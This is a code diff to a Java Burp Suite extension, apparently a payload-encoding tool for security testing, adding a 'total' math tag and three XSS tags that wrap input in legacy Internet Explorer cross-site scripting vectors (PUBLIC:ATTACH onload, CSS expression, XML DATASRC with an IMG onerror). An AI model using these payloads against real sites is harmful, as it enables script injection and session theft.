@@ -560,6 +560,10 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
 			tag.argument1 = new TagArgument("int","0");
 			tag.argument2 = new TagArgument("int","100");
 			tags.add(tag);
+			tags.add(new Tag("Math","total"));
+			tags.add(new Tag("XSS","behavior"));
+			tags.add(new Tag("XSS","css_expression"));
+			tags.add(new Tag("XSS","datasrc"));
 			tags.add(new Tag("XSS","eval_fromcharcode"));
 		}
 		public String html_entities(String str) {
@@ -886,8 +890,29 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
 			}
 			return StringUtils.join(output,",");
 		}
+		public String total(String str) {
+			String[] chars = str.split(",");
+			int total = 0;
+			for(int i=0;i<chars.length;i++) {
+				try {
+					total += Integer.parseInt(chars[i]);
+				} catch(NumberFormatException e){
+					stderr.println(e.getMessage());
+				}				
+			}
+			return Integer.toString(total);
+		}
 		public String eval_fromcharcode(String str) {
 			return "eval(String.fromCharCode("+this.to_charcode(str)+"))";
+		}
+		public String behavior(String str) {
+			return "<PUBLIC:ATTACH EVENT=onload ONEVENT="+str+" FOR=window />";
+		}
+		public String css_expression(String str) {
+			return "xss:expression(open("+str+"))";
+		}
+		public String datasrc(String str) {
+			return "<xml ID=xss><x><B>&lt;IMG src=1 onerror="+str+"&gt;</B></x></xml><SPAN DATASRC=#xss DATAFLD=B DATAFORMATAS=HTML></SPAN>";
 		}
 		private String callTag(String tag, String output, ArrayList<String> arguments) {
 			if(tag.equals("html_entities")) {
@@ -988,6 +1013,14 @@ public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
 				output = this.md5(output);
 			} else if(tag.equals("range")) {
 				output = this.range(output, this.getInt(arguments,0),this.getInt(arguments,1));
+			} else if(tag.equals("total")) {
+				output = this.total(output);
+			} else if(tag.equals("behavior")) {
+				output = this.behavior(output);
+			} else if(tag.equals("css_expression")) {
+				output = this.css_expression(output);	
+			} else if(tag.equals("datasrc")) {
+				output = this.datasrc(output);		
 			} else if(tag.equals("eval_fromcharcode")) {
 				output = this.eval_fromcharcode(output);
 			}
